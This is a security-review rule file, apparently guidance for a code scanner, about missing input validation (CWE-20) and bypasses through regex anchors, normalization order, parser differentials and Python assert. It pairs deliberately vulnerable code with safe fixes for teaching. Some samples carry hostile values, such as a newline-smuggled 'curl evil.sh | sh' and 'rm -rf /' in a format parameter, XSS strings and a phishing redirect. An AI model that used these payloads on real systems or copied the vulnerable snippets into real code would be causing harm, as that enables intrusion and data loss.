---
name: input_validation
version: "0.3"
description: Detect missing or weak input validation as a standalone defense-in-depth finding (CWE-20) — a parameter, field, DTO property, GraphQL argument, or structured model/tool output whose semantics imply a constrained contract is accepted without format, allowlist, schema, scalar, required-field, or exact-type validation. Also covers validation-order bypasses where a value is normalized/case-mapped/decoded/stripped *after* it is validated (CWE-179/180 — Unicode NFKC, toUpperCase, URL-decode re-creating a payload the filter rejected) numeric NaN/inf parse-coercion bypasses, Python security checks written as `assert` (silently stripped under `python -O`), and regex allowlists anchored with `^`/`$` instead of `\A`/`\z` (in Ruby `^`/`$` are always line anchors, so a newline-embedded payload passes the check — CWE-777), and the dual defect where a **guard** regex under-matches because `.` excludes newlines by default (no DOTALL), so a `%0a` in the path makes an auth/routing check fail open while `startsWith`-style dispatch still reaches the protected handler. Applies across all languages and GraphQL even when NO injection sink is present. Excludes legitimately free-text fields and already-validated inputs.
---

# Improper Input Validation (CWE-20 / CWE-1287)

The **type/format of an input is its first validation boundary.** When a value whose *semantics* are constrained (an email is an email, a zip code is a zip code, a sort order is one of N values) is accepted as a free-form `String`/`text`/`JSON`/`any` with no format check, enum, validated scalar, or schema constraint before it is stored or used, the application has **no guarantee the data is well-formed**. This is a real defect on its own — data-integrity, downstream-consumer breakage, and a latent injection/abuse precursor — independent of whether a dangerous sink is reachable today.

This is the **standalone, low-severity** counterpart to the sink-driven classes. If user input reaches a SQL/NoSQL/SSRF/path/command/XSS/log sink, report the **higher** class (see Cross-References) — that supersedes this. Report this class when the value is **semantically constrained but unvalidated**, regardless of sink.

## What It Is / Is Not

- **Is**: a semantically-constrained input (name/purpose implies a format or fixed set) typed/accepted as free-form and persisted or consumed with **no** validation (format regex, library validator, `enum`, validated custom scalar, schema/DTO constraint, or server-side allowlist). Severity **Low** (defense-in-depth / data integrity).
- **Is not**:
  - **Free-text fields** — `name`, `firstName`, `lastName`, `title`, `subject`, `description`, `bio`, `about`, `comment`, `body`, `message`, `content`, `note`, `caption`, `query`/`q`/`search`/`searchTerm`, `feedback`, free-form `address`/`addressLine`. These legitimately accept arbitrary text. **Do not flag.**
  - **Already-validated** inputs — a preceding anchored regex / library validator / `enum` type / validated scalar / schema (Zod/Joi/Yup/JSON-Schema/Pydantic/Bean Validation/`[EmailAddress]`) / server-side allowlist makes it **SAFE**.
  - **A reachable injection/IDOR/mass-assignment/SSRF/etc. sink** — that is the higher-severity class; report there, not here (this one is the precursor and is **superseded**, not double-reported).
  - **Length-only / DoS** concerns — see `denial_of_service.md` / `graphql_dos.md` (unbounded list/string size).

## Severity

**Low** by default (CWE-20 semantic-type mismatch with no validation). This class is an **explicit exception** to the "defense-in-depth gaps are Info / hardening-note-only" rule: a *semantically constrained* unvalidated input is reported as a standalone **Low** finding, not silently demoted to a hardening note. Borderline cases (weak-but-present validation, e.g. unanchored regex) → **Info**.

## Semantic-domain fields to flag (name/purpose implies a constrained format)

**This table is REPRESENTATIVE, not exhaustive.** Flag from the *principle* — "the field's name or documented purpose implies a constrained format or a fixed set of values" — not from literal membership in this list. A field absent from the table is **not** therefore safe: if a developer would recognize it as a constrained domain (e.g. `ssn`, `latitude`, `hostname`, `mimeType`, `cron`, `isbn`), flag it the same way. The only closed lists here are the **free-text exclusions** and the **de-confliction** carve-outs below.

| Domain | Typical names | Expected validation |
|--------|---------------|---------------------|
| Email | `email`, `e_mail`, `userEmail`, `contactEmail` | RFC/library email validator or `EmailAddress` scalar |
| Postal | `zip`, `zipCode`, `postal`, `postalCode`, `postcode` | country-aware format / regex |
| Phone | `phone`, `tel`, `mobile`, `msisdn`, `phoneNumber` | E.164 / libphonenumber |
| URL/URI | `url`, `uri`, `link`, `website`, `callback`, `redirect`, `webhookUrl` | URL parse + scheme/host allowlist (also SSRF/open-redirect if it's fetched/redirected — use that class) |
| Host/DNS | `hostname`, `domain`, `subdomain`, `fqdn`, `port` | hostname/port format + (if connected to) allowlist |
| UUID/ID | `uuid`, `guid`, `*Id`/`*_id` meant to be UUID/int | `UUID`/`Int`/`ID` typed + format check |
| Gov/identity IDs | `ssn`, `nationalId`, `taxId`, `passportNumber`, `licenseNumber` | anchored format regex (and treat the value as PII — see `privacy_data_protection.md`) |
| Payment/financial | `creditCard`, `cardNumber`, `cvv`, `iban`, `routingNumber`, `accountNumber` | Luhn/format check + range (also PCI/PII handling) |
| Date/time | `date`, `dob`, `birthDate`, `birthYear`, `*_at`, `timestamp`, `expiry` | ISO-8601 / date type |
| Geo | `country`, `countryCode`, `currency`/`currencyCode`, `locale`, `lang`/`language`/`languageTag`, `timezone` | ISO 3166/4217/639 allowlist or `enum` |
| Geo-coordinates | `latitude`, `longitude`, `lat`, `lng`, `coordinates`, `altitude` | numeric + range (−90..90 / −180..180) |
| Network | `ip`, `ipAddress`, `ipv6`, `cidr`, `mac`/`macAddress` | canonicalized IP/CIDR/MAC validator |
| Media/MIME | `mimeType`, `contentType`, `fileExtension`, `httpMethod` | allowlist / `enum` |
| Enum-like | `status`, `state`, `type`, `kind`, `mode`, `sort`, `order`, `direction`, `unit`, `category`, `gender` | `enum` type / server-side allowlist |
| Numeric/bounded | `age`, `quantity`, `count`, `rating`, `percent`/`percentage`, `priority` | numeric type + range check |
| Format-coded | `color`/`hexColor`, `slug`, `sku`, `vin`, `licensePlate`, `isbn`, `ean`/`upc`, `semver`, `cron` | anchored format regex |

**Ambiguous fields (`username`, `handle`, `version`, `gender`, `displayName`):** flag only if the app *intends* a constrained format (format rules referenced elsewhere, an `enum`, or a documented pattern). If the field legitimately accepts free identity text / arbitrary labels, treat as free-text (no finding). When unsure, prefer **Info** over Low rather than a false Low.

**De-confliction (do NOT mislabel):**
- `role`, `permission`, `scope`, `isAdmin`, `accountType`, `plan`, `tenantId`/`orgId` that the caller can **set on itself or another principal** → **`mass_assignment.md` / `privilege_escalation.md` / `idor.md`**, not this class.
- `password`/secret/token fields (`password`, `apiKey`, `jwt`, `token`, `secret`, `privateKey`) → exclude (format validation is not the concern; see auth/crypto/secrets refs). Mirror the pentest convention of excluding `password` from generic input-validation flags.

## Vulnerable vs Safe

**VULN (GraphQL SDL + resolver, no sink — still a Low finding):**
```graphql
type Mutation {
  # semantic domains typed as free-form String, no validated scalar / enum
  updateProfile(email: String!, zipCode: String!, country: String!, sort: String!): User!
}
```
```ts
updateProfile: (_, { email, zipCode, country, sort }, ctx) =>
  ctx.db.users.update({ where: { id: ctx.userId }, data: { email, zipCode, country, sort } }); // parameterized; no format/enum check anywhere
```

**SAFE (validated scalars + enum at the schema boundary):**
```graphql
scalar EmailAddress       # graphql-scalars: validates in parseValue/parseLiteral
enum SortOrder { ASC DESC }
type Mutation {
  updateProfile(email: EmailAddress!, zipCode: String!, country: CountryCode!, sort: SortOrder!): User!
}
```

**VULN (general — REST handler, parameterized DB, still Low):**
```python
email = request.json["email"]; zip_code = request.json["zip"]; country = request.json["country"]
db.execute("UPDATE users SET email=%s, zip=%s, country=%s WHERE id=%s", (email, zip_code, country, g.uid))  # no validation
```

**SAFE (schema/DTO validation before use):**
```python
class ProfileIn(BaseModel):                      # pydantic
    email: EmailStr
    zip: constr(pattern=r"^\d{5}(-\d{4})?$")
    country: Literal["US","CA","GB", ...]        # allowlist
data = ProfileIn(**request.json)                 # rejects malformed input before any use
```

**SAFE (free-text — correctly NOT flagged):** `bio: String`, `comment: String`, `searchTerm: String` accepting arbitrary text.

### Parsed JSON is not a validated contract — structured model/tool output

Treat LLM, agent, plugin, webhook, and tool output as untrusted structured input even when the producer was prompted to return “exact JSON.” `json.loads()` (or a brace/code-fence extraction fallback) proves only that some bytes form JSON; it does **not** prove that the result is the expected object, contains every required key, or uses the required types and ranges. This matters whenever fields drive a security decision such as keep/drop a finding, approve/deny an action, choose a tool, assign severity, or publish a result.

```python
# VULN — any parseable JSON is treated as a valid filter verdict.
ok, verdict = parse_json_with_fallbacks(model_text)
if ok:
    confidence = verdict.get("confidence_score", 10.0)
    keep = verdict.get("keep_finding", True)
    if not keep:
        suppress_finding()  # 0, [], null, or a missing/forged shape can alter policy

# SAFE — validate shape and semantics before the decision.
verdict = FilterVerdict.model_validate_json(model_text)  # strict Pydantic/JSON Schema
# required: keep_finding: strict bool; confidence_score: finite number in [1, 10]
if verdict.keep_finding is False:
    suppress_finding()
```

**SAST signal:** a permissive JSON extractor/parser feeds `.get()` defaults, truthiness checks, comparisons, indexing, dynamic dispatch, or allow/deny/filter/publish logic without an intervening schema/DTO validator. Look for fields named `allow`, `approved`, `keep_*`, `safe`, `action`, `tool`, `severity`, `confidence`, `score`, `findings`, or `results`. Also flag “exact JSON” prompts whose consumer accepts arrays/scalars, missing keys, unknown keys, stringified booleans/numbers, `NaN`/`Infinity`, or the first balanced object found inside arbitrary prose.

**SAFE:** use constrained/typed output at generation where available **and validate again at the consumer boundary**: require the top-level object, all decision fields, exact booleans/enums, finite bounded numbers, item schemas, and explicit unknown-field policy. On parse/schema failure, take the documented conservative branch and surface the failure; never silently manufacture a success verdict from `.get(..., permissive_default)`. If fallback extraction is unavoidable, validate the extracted candidate against the same schema before use and bind it to an explicit envelope/version so an unrelated embedded object cannot be mistaken for the verdict.

### Python NaN / numeric type-confusion (parse-coercion bypass)

A numeric field validated *after* coercion can be bypassed with the special float tokens `NaN`, `inf`, `-inf`: tainted request data passed to `float(...)`, `complex(...)`, or `bool(...)` (and `json.loads`, which parses bare `NaN`/`Infinity`) yields a value for which **every comparison is false** (`NaN < limit`, `NaN > limit`, `NaN == NaN` are all `False`). A range/threshold check (`if amount > MAX: reject`) therefore lets `NaN` through, and it can poison aggregates, balances, or auth scoring downstream. Flag tainted input reaching `float()`/`complex()`/`json.loads()` whose result feeds a comparison-based gate without an explicit `math.isnan()`/`math.isfinite()` (or NumPy `np.isnan`) check. **SAFE**: reject non-finite values (`if not math.isfinite(x): abort(400)`) or validate with a schema that disallows `NaN`/`inf` (pydantic `allow_inf_nan=False`).

### Canonicalize / normalize *after* validation (validation-order bypass, CWE-179 / CWE-180)

A general ordering defect: the code validates (or denylist-filters) the **raw** value, then a *later* step **transforms** the same value — Unicode normalization, case mapping, decoding, or character stripping — into something that would have failed the check, or that reconstitutes a payload. The validator inspected one string; the sink receives a different one. Distinct from the semantic-type gap above: validation may be *present and correct*, just in the wrong order.

Concrete transform-after-validation bypasses:
- **Unicode normalization (NFC/NFKC) after an HTML/keyword filter**: a `<script>`/tag filter passes because the input is `"﹤script﹥"` (small-form `<`/`>`), then a later `Normalizer.normalize(s, NFKC)` (or DB/template normalization) folds it to literal `<script>` → stored/reflected XSS. Same for fullwidth/compatibility forms folding to ASCII metacharacters.
- **Character deletion/replacement after validation**: stripping non-character or control code points *after* the filter rejoins a split token — input `"<scr﷯ipt>"` passes the `<script>` check, then removal of the non-character `﷯` yields `<script>`.
- **Case mapping after/within a check**: `toUpperCase()`/`toLowerCase()` is locale- and Unicode-lossy — `"ADMıN"` (dotless ı) uppercases toward `ADMIN`, `"ſcript"` (ſ) and `"ﬀ"` (ﬀ) case/normalize toward ASCII. A reserved-name or role gate that compares a *transformed* copy while trusting the original (or vice-versa) is bypassable.
- **Truncation after an extension/path allowlist (`#`/`?`/whitespace stripped post-check)**: the code validates the **raw** filename/path (e.g. `path.EndsWith(".js")` + `path.StartsWith(allowedDir)`), then **later** trims everything after a `#` (fragment), `?` (query), null byte, or trailing whitespace before the actual file read — `text.Left(text.IndexOf('#'))` / `Substring` / `TrimEnd` / `split('?')[0]`. So `secret.config#.js` passes the `EndsWith(".js")` allowlist yet the sink opens `secret.config`; `secret.config%23.js` (URL-encoded `#`) does the same after decoding. Server-side stripping of `#`/`?` is the tell — the fragment is normally client-only, so a backend that removes it *after* validating is validating a string it will never actually use. Detect an extension/prefix allowlist (`EndsWith`/`StartsWith`/suffix regex) followed — before the file/path sink — by `IndexOf('#'|'?')`+`Left`/`Substring`/`Truncate`/`TrimEnd`/`split` on the **same** value. Cross-ref `path_traversal_lfi_rfi.md`.

**SAST signal**: a validation / denylist / `equals`/`matches`/`contains` check on a value, followed — *before the sink* — by `Normalizer.normalize` / `.normalize('NFKC'|'NFC')` / `unicodedata.normalize` / `toUpperCase` / `toLowerCase` / `casefold` / `URLDecoder.decode` / `replaceAll`/`replace` removing characters, applied to the **same** value. The transform downstream of the gate is the bug.

**SAFE**: canonicalize first, validate second — decode/normalize (to a **fixpoint**: repeat until the string stops changing), case-fold, and strip/reject disallowed code points **before** the allowlist/format check, then carry the *canonical* form to the sink unchanged; reject (don't silently strip) non-character/control code points. Domain-specific instances of this same principle: host allowlists `ssrf.md` (normalize/IDNA before compare), path filters `client_side_path_traversal.md` / `path_traversal_lfi_rfi.md` (decode-to-fixpoint before check), identity/reserved-name fields `business_logic.md` (NFKC + confusables skeleton before uniqueness/blocklist).

### Regex anchored with `^`/`$` instead of `\A`/`\z` — multiline validation bypass (CWE-777)

A validation regex that *looks* anchored can still pass a multi-line payload, because in most flavors **`^` and `$` match at *line* boundaries, not string boundaries.** This is the default and non-optional behavior in **Ruby**: `^`/`$` always match the start/end of *any* line (Ruby's `/m` only makes `.` match newlines — it does **not** change `^`/`$`), and only `\A` (start of string), `\z` (very end), and `\Z` (end, but allows one trailing `\n`) anchor the *whole* string. So a Ruby allowlist like `/^[a-z0-9]+$/` accepts any value containing **one** conforming line: `"png\n; rm -rf /"` matches (line 1 `png` satisfies `^…$`) while the variable still holds the full newline-bearing string, which then reaches the sink intact. This is the reviewer blind spot the class exists to close — engineers steeped in PCRE/JS/Java/.NET (where `^`/`$` anchor the whole string unless a MULTILINE flag is set) read `^…$` as a full-string guarantee and **certify the vulnerable regex as safe**.

```ruby
# VULN — ^…$ are LINE anchors in Ruby, so a newline smuggles a payload past the "alphanumeric" gate
FORMAT_RE = /^[a-z0-9]+$/
fmt = params[:format]                                   # "png\n; curl evil.sh | sh"
return head(:bad_request) unless fmt =~ FORMAT_RE       # PASSES: line 1 "png" matches ^…$
system("convert in.svg out.#{fmt}")                     # shell runs the 2nd line -> RCE (CWE-78)

# VULN — same defect in a Rails model validator (Brakeman: "Format Validation", warning validation_regex)
validates :redirect_url, format: { with: /^https:\/\/([a-z0-9-]+\.)*example\.com\// }
#   "https://x.example.com/\nhttps://evil.tld/phish" passes -> open redirect / SSRF at the sink

# SAFE — \A…\z anchor the WHOLE string (reject any embedded newline)
FORMAT_RE = /\A[a-z0-9]+\z/
validates :redirect_url, format: { with: /\Ahttps:\/\/([a-z0-9-]+\.)*example\.com\// }
```

Any Ruby security allowlist built with `^…$` — redirect/host, filename/extension, SQL `ORDER BY` column, output format, role/permission string — is bypassable by newline injection into whatever sink it guards (RCE, open redirect, SSRF, path traversal, SQLi). **Fix:** use `\A…\z` (prefer `\z` over `\Z`, which still permits a trailing `\n`), or a string-equality / `enum` / fixed-set allowlist. The same trap appears in **other flavors whenever a MULTILINE flag is set on a validation regex** — Python `re.MULTILINE`, JS `/m`, PHP `/m`, .NET `RegexOptions.Multiline`, Go `(?m)` — there `^`/`$` likewise match line boundaries; and Python `re.match`/`re.fullmatch` subtleties bite too (`re.match(r"[a-z]+$", "a\nX")` still matches because `$` allows a final line-break — use `\Z`/`re.fullmatch` and reject `\n`).

**SAST signal:** a Ruby `validates …, format:` / `validates_format_of` / `=~` / `match?` / `.match` used as a **security allowlist** whose regex anchors with `^`/`$` rather than `\A`/`\z` — highest priority on `redirect`/`url`/`host`/`path`/`filename`/`format`/`sort`/`role` fields — or any language's validation regex carrying a MULTILINE flag. Confirm the value with the embedded-newline variant actually reaches a sink or trust decision. Brakeman dedicates a check to exactly this (`CheckValidationRegex`).

### Guard regex under-matches: `.` excludes newlines, so a protected path escapes the check (CWE-625/CWE-863)

The section above covers a regex that matches **too much** (an allowlist accepts a newline-bearing payload). This is its **dual, and the direction reviewers reliably miss**: when the regex is a **guard** — match ⇒ *require auth* / *block* / *route to the sensitive handler* — then a regex that matches **too little** fails **open**. In every mainstream flavor **`.` does not match a line terminator by default**, so a single `%0a` in the request path makes a `.`-based protect-pattern stop matching, and the guard silently does not fire.

```java
// VULN — guard under-matches: ".*" cannot cross the "\n", so matches() is FALSE and auth is skipped
private static final Pattern PROTECTED = Pattern.compile("/internal/admin/.*");

String path = URLDecoder.decode(req.getRequestURI(), StandardCharsets.UTF_8);  // "/internal/admin/keys%0a" -> "...keys\n"
if (PROTECTED.matcher(path).matches()) {          // FALSE  -> whole auth block skipped
    if (!tokens.isOperator(req.getHeader("X-Operator-Token"))) { res.sendError(403); return; }
}
chain.doFilter(req, res);                          // request proceeds unauthenticated

// ...while the thing that actually dispatches uses plain string logic, which DOES match:
if (path.startsWith("/internal/admin/")) return ADMIN_BACKEND;   // TRUE -> admin backend reached
```

The bug is the **disagreement between the guard's matcher and the dispatcher's matcher over the same string** — regex `.` semantics on one side, `startsWith`/`equals`/prefix-trie on the other. Trailing `\n` is the cheapest wedge, but `\r`, `\u0085`, `\u2028`, and `\u2029` are also line terminators to Java's `Pattern` (JS adds `\u2028`/`\u2029`; Go/Python/PCRE/.NET use `\n`).

| Flavor | Default `.` | Opt-in to match newlines |
|---|---|---|
| Java `Pattern` | excludes line terminators | `Pattern.DOTALL` / `(?s)` |
| Python `re` | excludes `\n` | `re.DOTALL` / `(?s)` |
| JS | excludes line terminators | `s` flag |
| .NET `Regex` | excludes `\n` | `RegexOptions.Singleline` |
| PHP / PCRE | excludes `\n` | `/s` |
| Go `regexp` | excludes `\n` | `(?s)` |
| Ruby | excludes `\n` | `/m` (Ruby's `/m` **is** DOTALL — it does *not* touch `^`/`$`; see the section above) |

**SAST signal:** a regex used as an **authorization / routing / blocking** decision — `Pattern.compile("…/admin/.*")`, a Spring Security `regexMatchers`/`RequestMatcher`, an nginx `location ~`, an API-gateway route guard, a WAF-ish deny pattern — where the pattern contains `.`/`.*`/`.+` **without** the DOTALL flag, *and* the protected resource is selected downstream by different logic (`startsWith`, `equals`, framework routing). Confirm by asking one question: **does appending `%0a` to the path flip the guard's verdict without flipping the dispatcher's?** Prioritize where the path is `URLDecoder.decode`'d before matching (that is what turns `%0a` into a real `\n`) — and note this stacks with the decode-then-match ordering bug above.

**SAFE**: don't express a path guard as a permissive regex. Match the **canonicalized** path with the *same* primitive the dispatcher uses (`startsWith` on a normalized path, or the framework's own `AntPathMatcher`/route table so guard and dispatch share one parser); **reject** any path containing a control character or line terminator at the edge before routing; if a regex is unavoidable, enable DOTALL (`(?s)`) *and* anchor with `\A…\z`, or use `[\s\S]*` instead of `.*`. Deny-by-default (guard everything, allowlist the public prefixes) turns this whole class from fail-open into fail-closed. Cross-ref `reverse_proxy_access_bypass.md` and `privilege_escalation.md`.

### Skip/exempt list matched by substring containment instead of path-component equality (CWE-697)

The guard defects above fail open because an *attacker* shapes the string. This one fails open with **no attacker input at all**: an exemption list (skip these dirs, treat these prefixes as public, don't redact these keys) is tested with `marker in path` — substring containment over the **whole path** — rather than equality against **path components**. Every path that merely *contains* the token is exempted: `latest`, `contest`, `attestation`, `protest` all contain `test`; `resample` contains `sample`; `vendored` and `vendor-api` contain `vendor`; `/api/publications` contains `public`. Because the test runs against the full path, **one matching ancestor silently drops the entire subtree** — a repo, bucket, or tenant directory named `contest-api` disables the control for everything beneath it.

```python
SKIP_MARKERS = ["test", "example", "vendor"]

# VULN — containment over the full path: "src/latest/" contains "test", so the subtree is never audited
for dirpath, _, filenames in os.walk(root):
    if any(marker in dirpath.lower() for marker in SKIP_MARKERS):
        continue
    audit(dirpath, filenames)

# SAFE — set membership over normalized path components
SKIP_DIRS = {"test", "tests", "example", "examples", "vendor"}
for dirpath, _, filenames in os.walk(root):
    if SKIP_DIRS & {part.lower() for part in Path(dirpath).parts}:
        continue
    audit(dirpath, filenames)
```

Two distinct impacts, and the first is the one that goes unnoticed for years: (a) **silent loss of coverage** — the scanner, audit, redaction, or auth filter reports success while never having examined the exempted production paths, so the control's own output is what conceals the gap; (b) **attacker-nameable exemption** wherever any path segment is attacker-influenced (repo layout, upload path, object key, tenant/branch name) — naming a directory `tests-v2` or `my-sample` moves their content inside the exemption and turns off the control for it.

**SAST signal:** a collection of bare tokens (no separators, no anchors) consumed by `in`/`.includes()`/`.contains()`/`str.find` against a path, URL path, or key — `any(m in path for m in SKIP)`, `EXCLUDES.some(e => p.includes(e))`, `strings.Contains(path, skip)` — where the verdict **skips** a security-relevant action (scan, authn/authz, redaction, signature check, quota). Two questions settle it: does a common English word containing the token (`latest` ⊃ `test`, `publications` ⊃ `public`) hit the exemption, and is the match run against the **full path** rather than one component?

**SAFE**: compare **normalized path components** for equality against a set (`Path(p).parts`, `p.split('/')`), or anchor the match to segment boundaries (`p == m or p.startswith(m + '/')`). Keep exemptions rooted and explicit (`vendor/` at the repo root, not `vendor` anywhere), and make the control **report what it skipped** so an over-broad exemption is visible instead of silent. Cross-ref `path_traversal_lfi_rfi.md` (the `startsWith` prefix-sibling defeat, `/safe-evil`, is the same boundary error) and `ssrf.md` (the host-allowlist form of substring matching).

### Mode/branch selected by substring-searching a buffer that also carries untrusted data (CWE-807)

The exempt-list defect above lets an innocent *name* drift inside an exemption. This one is sharper, and it is a **control-channel forgery**: the code needs to know *which kind of request it is handling*, and it recovers that fact by searching the composed payload for a marker phrase — `if TEMPLATE in prompt`, `if "admin" in body`, `if "/internal/" in url`, `if "ERROR" in proc_output`. The marker and the untrusted data share **one buffer**, so any caller whose attacker-supplied bytes happen to contain the marker is routed as the *other* kind of request. The root cause is upstream of the comparison: the request type was known at the call site, thrown away, and then reconstructed by grepping — and grep cannot distinguish the template's copy of the marker from the payload's.

```python
SUMMARY_INSTRUCTIONS = "Write a two-sentence overview. Plain prose only."

# VULN — the branch decides whether output is sanitized, and `prompt` embeds attacker file content.
# A customer file containing the marker phrase routes its own module docs down the raw path.
def complete(self, prompt: str) -> str:
    text = self.model.generate(prompt)
    if SUMMARY_INSTRUCTIONS in prompt:   # plain prose, nothing to strip
        return text
    return sanitize_fragment(text)

# SAFE — the mode travels out-of-band; no payload byte can change it.
def complete(self, prompt: str, kind: PromptKind) -> str:
    text = self.model.generate(prompt)
    return text if kind is PromptKind.SUMMARY else sanitize_fragment(text)
```

**Why review misses it:** the branch reads as ordinary plumbing, and the instinctive check is *"does the intended caller take the right path?"* — which it does, so the branch is pronounced fine. The defect only surfaces on the inverse question: **which *other* callers reach this predicate, and can any bytes they concatenate into the buffer contain the marker?** Reviewers who trace only the intended direction (summary prompt → summary branch) systematically clear this bug; the marker phrase is long and English-looking, which reinforces the feeling that it could never appear "by accident" — but the attacker is not relying on accident.

**SAST signal:** a mode/route/trust decision of the shape `if <string constant or template variable> in <buffer>` where `<buffer>` is assembled by concatenation, f-string, or `join` from at least one request-, file-, upload-, or model-supplied component, and the branch selects between **sanitized and raw output, privileged and unprivileged handling, redacted and verbatim logging, or cheap and audited paths**. Resolve the buffer back through every concatenation that fed it; if any component is attacker-influenced, treat the predicate as attacker-controlled regardless of how distinctive the marker looks. The same shape appears well outside LLM code: `if "error" in subprocess_output` where the output echoes a user-supplied filename, `if secret_tag in serialized_blob` for tenant routing, and `if "SELECT" in stmt` choosing a read replica.

**SAFE**: pass the mode **out-of-band** — an explicit parameter, enum, or separate typed method (`summarize()` vs `document()`) — so the control signal never shares a channel with the data. Where a marker genuinely must travel in-band, make it unforgeable (a per-request nonce) *and* reject content that already contains it. Independently, **make the secure branch the default** (`if kind is SUMMARY: return raw` — not `if marker: return raw`), so a forged or missing signal degrades to the sanitized path instead of the raw one. Cross-ref `trust_boundary.md` (control/data channel confusion) and `prompt_injection.md` (static-delimiter forgery — the same in-band failure where the *model*, rather than the application code, is the parser being fooled).

### Query-string parser differential (validate with one parser, consume with another)

A sibling of the ordering defect: the request's query string is **validated by one parser but consumed by a different one**, so the two disagree on the same bytes and a payload that passed validation reaches the sink. Common in Node — `qs` (Express `req.query`, bracket-aware) vs the browser/`URLSearchParams` (or vice-versa) — and PHP/Rack bracket parsing vs a flat reader. Divergences that smuggle a value past a validator: **bracket notation** (`a[b]=x` — `qs` builds a nested object while `URLSearchParams` sees the literal key `a[b]`, so a validator keyed on `redirect`/`q` never sees the value the sink reads), **`]=`/delimiter precedence**, **duplicate keys** (first-vs-last-wins mismatch), and **`qs` `parameterLimit` (default 1000)** — parameters past the cap are silently dropped by the server-side validator but still read by a downstream or client parser, so an XSS/`redirect`/SSRF payload hidden in overflow params or a bracketed key validates as *absent* yet is consumed as *present*. **SAST signal**: a security check that reads a param through one API (`qs.parse`, `req.query`, a framework validator) while the sink reads the **same** query through a different API (`URLSearchParams`, manual `location.search`/`split('&')`, or a second service). **SAFE**: validate and consume the query with the **same** parser; coerce each security-relevant key to a single scalar (reject arrays/bracket/duplicate shapes); re-validate the exact value handed to the sink.

The same **cross-parser differential** hits other structured formats parsed twice. **YAML tags**: a tag honored by one parser and dropped by another — Ruby Psych decodes a `!binary`/custom tag while Go `gopkg.in/yaml.v3` drops it — lets a field slip past a validator that never sees it yet reach the consumer that does, bypassing an allowlist/`parent`/type check across a Ruby↔Go (or any two-runtime) boundary. **General rule**: whenever the *same* request or document is parsed by two different parsers (edge vs origin, validator vs consumer, one language/library vs another), any value they decode differently defeats a check performed on only one of them — validate the exact representation the sink will use, or parse once and pass the parsed object.

### JSON body duplicate-key drift (policy/gateway vs execution)

RFC 8259 leaves duplicate object-member precedence **undefined**. Real stacks disagree: many Java/`Jackson`/`Gson`, Python `json.loads`, and JS `JSON.parse` are **last-wins**; Go `encoding/json` historically keeps the **first** value; some WAF/API-gateway/JSON-Schema validators use yet another rule (or reject duplicates). When a **policy / gateway / limit / fraud sidecar** parses the raw body one way and the **execution service** parses the *same bytes* another way, security-relevant fields desync.

**Canonical shape (money / limits):** `POST /api/transfers` with body `{"amount":10,"amount":1000}` (or `{"limit":…,"limit":…}`, `{"price":…}`, `{"quantity":…}`). Policy last-wins sees `1000` and allows (under a 5000 daily cap); execution first-wins debits `10` — undercharge / ledger drift. **Inverse also VULN:** policy first-wins sees `10` (allow) while execution last-wins moves `1000` (overcharge / limit bypass).

```python
# VULN — same raw body, two decoders, two amounts
raw = request.get_data(as_text=True)
policy = json.loads(raw, object_pairs_hook=dict)          # last-wins → 1000 → allow
body = first_wins_loads(raw)                               # first-wins → 10
debit(user_id, body["amount"])                             # executes 10 after policy saw 1000
```

**SAST signals:**
- Edge/gateway/WAF/policy service and origin **both** `json.loads` / `JSON.parse` / `ReadValue` / `Unmarshal` the **raw** request body (or a forwarded copy) independently — especially across language boundaries (Go↔Node, Java gateway↔Python worker).
- Custom `object_pairs_hook` / `JsonParser.Feature.STRICT_DUPLICATE_DETECTION` off / dual JSON libraries in one path.
- Amount/price/quantity/limit fields consumed after a separate policy parse of the same bytes.

**Not this class alone:** query-string HPP (`amount=10&amount=1000`) — covered above; IDOR `{"id":1,"id":2}` — `idor.md`; email duplicate keys — `business_logic.md` / `email_parser_differential.md`. Prefer `business_logic.md` when the durable impact is a ledger/entitlement invariant; keep the finding here when the root cause is the dual JSON parse.

**SAFE:** parse **once** at the trust boundary; pass the parsed object (or a canonical re-serialized body with duplicate keys rejected) to policy and execution; or enable strict duplicate-key rejection (`STRICT_DUPLICATE_DETECTION`, reject on `object_pairs_hook` seeing a repeated key) on **every** consumer of the raw bytes. Cross-ref `business_logic.md` (price/amount invariants), `api_security.md` (edge vs internal parse), `reverse_proxy_access_bypass.md` (query delimiter desync).

### Python `assert` used as a security/validation gate (disabled under `-O`, CWE-617)

Python `assert` statements are **removed entirely** when the interpreter runs with `-O`/`-OO` (or `PYTHONOPTIMIZE` set, and `__debug__` becomes `False`) — common in production/optimized container images. Any **security check, input validation, or precondition enforced with `assert` therefore vanishes in production**, so the gate that passes in dev is a no-op in prod. The same footgun exists in other toolchains: **Java** assertions are off unless `-ea` is passed (disabled by default in production JVMs); **C/C++** `assert()` is compiled out under `NDEBUG` (implied by release builds / `-DNDEBUG`); **Swift** `assert`/`assertionFailure` are elided in `-O` release builds (use `precondition`, which survives); **.NET** `Debug.Assert` is dropped from Release builds (no `DEBUG` symbol). A security/authorization/validation condition expressed as an assertion in any of these likewise disappears from the shipped optimized build.

```python
# VULN — both checks are stripped under `python -O`; the function then runs with unvalidated/forbidden input
def transfer(user, amount):
    assert user.is_authenticated, "must be logged in"   # authz gate — gone under -O
    assert amount > 0 and amount <= user.balance         # validation — gone under -O
    do_transfer(user, amount)

# SAFE — raise a real exception that is NOT compiled out
def transfer(user, amount):
    if not user.is_authenticated:
        raise PermissionError("must be logged in")
    if not (0 < amount <= user.balance):
        raise ValueError("invalid amount")
    do_transfer(user, amount)
```

**TRUE POSITIVE**: an `assert` whose condition performs authorization, authentication, input validation, or a security-relevant precondition (anything an attacker could violate) in code that ships to production. **FALSE POSITIVE**: `assert` in tests, or asserting an internal invariant that no untrusted input can influence (a developer sanity check). **Grep**: `^\s*assert\b` in non-test `.py`, then read the condition — is it guarding against attacker-controlled state?

## Recon Indicators (Grep)

```bash
# GraphQL SDL: semantic-domain args/fields typed as free-form String/JSON (then check for a validated scalar/enum/validation).
# NOTE: leading \b anchors the token to the start of the field identifier so short tokens (ip, date, order) don't
# substring-match free-text fields (recipient, description, updatedBy). Approximate recon aid — triage hits against the
# semantic principle; camelCase SUFFIXES (e.g. userEmail, contactPhone) won't match here, catch those by review.
rg -n "\b(email|e_?mail|zip|postal|phone|msisdn|url|uri|uuid|guid|country|currency|locale|timezone|ip|ipaddress|ipv6|hostname|domain|fqdn|date|dob|birth|expiry|ssn|nationalid|taxid|passport|creditcard|cardnumber|cvv|iban|routing|latitude|longitude|status|sort|order|direction|category|gender|mimetype|contenttype|fileextension|isbn|ean|upc|vin|semver|cron|slug|hexcolor)\w*\s*:\s*(String|JSON|JSONObject|AWSJSON)!?" --glob '*.{graphql,graphqls}' -i
